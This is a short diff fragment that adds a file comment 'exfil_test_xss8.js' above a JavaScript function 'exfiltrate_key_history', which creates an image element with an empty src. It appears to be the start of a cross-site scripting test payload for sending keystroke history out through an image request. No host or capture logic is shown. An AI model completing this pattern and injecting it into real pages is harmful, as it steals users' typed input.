@@ -1,3 +1,4 @@
+// exfil_test_xss8.js
 function exfiltrate_key_history() {
   var script = document.createElement("img");
   script.src = "";
